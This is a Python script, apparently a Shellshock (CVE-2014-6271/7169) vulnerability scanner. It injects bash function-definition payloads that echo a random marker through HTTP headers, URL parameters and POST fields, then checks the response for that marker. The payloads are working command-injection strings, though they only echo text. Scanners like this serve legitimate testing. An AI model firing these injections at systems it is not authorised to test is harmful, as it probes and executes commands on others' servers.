#!/usr/bin/env python3

import requests
import urllib3
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass
from enum import Enum
import time
import random
import string
import sys


from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich.panel import Panel
from rich import box
from rich.text import Text


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

def display_banner() -> None:
    banner_text = Text(r"""
   ____ _          _ _     ____ _           _    
  / ___| |__   ___| | |___/ ___| |__   ___ | | __
 | |   | '_ \ / _ \ | / __\___ \ '_ \ / _ \| |/ /
 | |___| | | |  __/ | \__ \___) | | | | (_) |   < 
  \____|_| |_|\___|_|_|\___|____/|_| |_|\___/|_|\_\\
  
          Shellshock Vulnerability Scanner v1.0
          CVE-2014-6271 / CVE-2014-7169 Detector
    """, style="bold cyan")

    panel = Panel(
        banner_text,
        subtitle="Advanced Bash Injection Testing Tool",
        subtitle_align="right",
        border_style="bright_magenta",
        box=box.DOUBLE,
        padding=(1, 2),
        expand=False
    )
    console.print(panel)


class VulnerabilityStatus(Enum):
    VULNERABLE = "VULNERABLE"
    NOT_VULNERABLE = "NOT_VULNERABLE"
    ERROR = "ERROR"
    TIMEOUT = "TIMEOUT"


@dataclass
class ShellshockResult:
    target_url: str
    status: VulnerabilityStatus
    vulnerable_vectors: List[str]
    details: str
    response_time: float
    error_message: Optional[str] = None

class ShellshockScanner:
    def __init__(self, timeout: int = 10, verify_ssl: bool = False):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.marker = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
        self.payloads = [
            f"() {{ :; }}; echo; echo {self.marker}",
            f"() {{ _; }} >_[$($())] {{ echo {self.marker}; }}",
            f"() {{ :;}}; echo {self.marker}",
        ]
        self.test_headers = [
            "User-Agent", "Referer", "Cookie", "X-Forwarded-For",
            "Accept-Language", "Accept-Encoding", "Connection", "Host", "Accept",
        ]

    def _check_response(self, response: requests.Response) -> bool:
        if self.marker in response.text:
            return True
        for header_value in response.headers.values():
            if self.marker in str(header_value):
                return True
        return False

    def _test_vector(self, method: str, url: str, progress: Progress, task_id: int) -> Tuple[bool, List[str]]:
        vulnerable_vectors = []

        if method == "headers":
            items = self.test_headers
            desc = "Testing HTTP Headers"
        elif method == "params":
            items = ["cmd", "exec", "command", "execute", "ping", "query", "test"]
            desc = "Testing URL Parameters"
        elif method == "post":
            items = ["input", "data", "field", "value", "text", "search"]
            desc = "Testing POST Data"
        else:
            return False, []

        total_tests = len(items) * len(self.payloads)
        progress.update(task_id, description=desc, total=total_tests)

        for item in items:
            for payload in self.payloads:
                progress.advance(task_id)
                try:
                    if method == "headers":
                        headers = {item: payload}
                        response = self.session.get(url, headers=headers, timeout=self.timeout, allow_redirects=False)
                    elif method == "params":
                        test_url = f"{url}?{item}={payload}"
                        response = self.session.get(test_url, timeout=self.timeout, allow_redirects=False)
                    elif method == "post":
                        data = {item: payload}
                        response = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=False)

                    if self._check_response(response):
                        vector = f"{method.upper()}: {item}"
                        vulnerable_vectors.append(vector)
                        break
                    time.sleep(0.05)
                except requests.exceptions.RequestException:
                    continue

        return len(vulnerable_vectors) > 0, vulnerable_vectors

    def scan(self, target_url: str, test_methods: Optional[List[str]] = None) -> ShellshockResult:
        start_time = time.time()
        vulnerable_vectors = []

        if test_methods is None:
            test_methods = ['headers', 'params', 'post']

        try:
            if not target_url.startswith(('http://', 'https://')):
                return ShellshockResult(
                    target_url=target_url,
                    status=VulnerabilityStatus.ERROR,
                    vulnerable_vectors=[],
                    details="Invalid URL format. Must start with http:// or https://",
                    response_time=0.0,
                    error_message="Invalid URL format"
                )

            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                TimeElapsedColumn(),
                console=console
            ) as progress:
                task_ids = {}
                for method in test_methods:
                    task_id = progress.add_task(f"[bold yellow]Initializing {method}...", total=0)
                    task_ids[method] = task_id

                for method in test_methods:
                    task_id = task_ids[method]
                    is_vuln, vectors = self._test_vector(method, target_url, progress, task_id)
                    if is_vuln:
                        vulnerable_vectors.extend(vectors)

            response_time = time.time() - start_time

            if vulnerable_vectors:
                status = VulnerabilityStatus.VULNERABLE
                details = f"CRITICAL: Shellshock vulnerability detected via {len(vulnerable_vectors)} vector(s)!"
            else:
                status = VulnerabilityStatus.NOT_VULNERABLE
                details = "No Shellshock vulnerabilities detected."

            return ShellshockResult(
                target_url=target_url,
                status=status,
                vulnerable_vectors=vulnerable_vectors,
                details=details,
                response_time=response_time
            )

        except requests.exceptions.Timeout:
            return ShellshockResult(
                target_url=target_url,
                status=VulnerabilityStatus.TIMEOUT,
                vulnerable_vectors=[],
                details="Request timed out. Target may be unreachable or blocking requests.",
                response_time=time.time() - start_time,
                error_message="Connection timeout"
            )
        except requests.exceptions.ConnectionError as e:
            return ShellshockResult(
                target_url=target_url,
                status=VulnerabilityStatus.ERROR,
                vulnerable_vectors=[],
                details="Connection error: Unable to reach target.",
                response_time=time.time() - start_time,
                error_message=str(e)
            )
        except Exception as e:
            return ShellshockResult(
                target_url=target_url,
                status=VulnerabilityStatus.ERROR,
                vulnerable_vectors=[],
                details="Unexpected error during scan.",
                response_time=time.time() - start_time,
                error_message=str(e)
            )


def scan_shellshock_vulnerability(
    target_url: str,
    timeout: int = 10,
    verify_ssl: bool = False,
    test_methods: Optional[List[str]] = None
) -> ShellshockResult:

    display_banner()

    if not target_url:
        console.print("[red]Error: Target URL is required![/red]")
        sys.exit(1)

    console.print(f"[bold blue]Target:[/bold blue] {target_url}")
    console.print(f"[bold blue]Timeout:[/bold blue] {timeout}s | SSL Verify: {verify_ssl}\n")

    scanner = ShellshockScanner(timeout=timeout, verify_ssl=verify_ssl)
    result = scanner.scan(target_url, test_methods)

    table = Table(title="Scan Results", box=box.ROUNDED, show_header=True, header_style="bold magenta")
    table.add_column("Field", style="dim")
    table.add_column("Value")

    status_style = {
        VulnerabilityStatus.VULNERABLE: "bold red",
        VulnerabilityStatus.NOT_VULNERABLE: "bold green",
        VulnerabilityStatus.ERROR: "bold yellow",
        VulnerabilityStatus.TIMEOUT: "bold orange3",
    }.get(result.status, "white")

    table.add_row("Target URL", result.target_url)
    table.add_row("Status", f"[{status_style}]{result.status.value}[/{status_style}]")
    table.add_row("Scan Time", f"{result.response_time:.2f}s")
    table.add_row("Vectors Found", str(len(result.vulnerable_vectors)))

    console.print(table)

    panel_style = {
        VulnerabilityStatus.VULNERABLE: "bold red",
        VulnerabilityStatus.NOT_VULNERABLE: "bold green",
        VulnerabilityStatus.ERROR: "bold yellow",
        VulnerabilityStatus.TIMEOUT: "bold orange3",
    }.get(result.status, "white")

    icon = {
        VulnerabilityStatus.VULNERABLE: "Exploit",
        VulnerabilityStatus.NOT_VULNERABLE: "Success",
        VulnerabilityStatus.ERROR: "Error",
        VulnerabilityStatus.TIMEOUT: "Warning",
    }.get(result.status, "Info")

    details_panel = Panel(
        result.details,
        title=f"{icon} Details",
        border_style=panel_style,
        padding=(1, 2)
    )
    console.print(details_panel)

    if result.vulnerable_vectors:
        vec_table = Table(title="Vulnerable Vectors", box=box.SIMPLE)
        vec_table.add_column("Vector", style="cyan")
        for vec in result.vulnerable_vectors:
            vec_table.add_row(f"Exploit {vec}")
        console.print(vec_table)

    if result.error_message:
        console.print(f"[yellow]Error:[/yellow] {result.error_message}")

    console.print("\n" + "="*70 + "\n")

    return result

if __name__ == "__main__":
    if len(sys.argv) != 2:
        display_banner()
        console.print("[bold red]Usage:[/bold red] python shellshock_scanner.py <target_url>")
        console.print("[dim]Example: python shellshock_scanner.py http://vulnerable.com/cgi-bin/test.sh[/dim]")
        sys.exit(1)

    target = sys.argv[1]
    result = scan_shellshock_vulnerability(
        target_url=target,
        timeout=15,
        verify_ssl=False
    )

    exit_code = {
        VulnerabilityStatus.VULNERABLE: 1,
        VulnerabilityStatus.ERROR: 2,
        VulnerabilityStatus.TIMEOUT: 3,
    }.get(result.status, 0)

    sys.exit(exit_code)
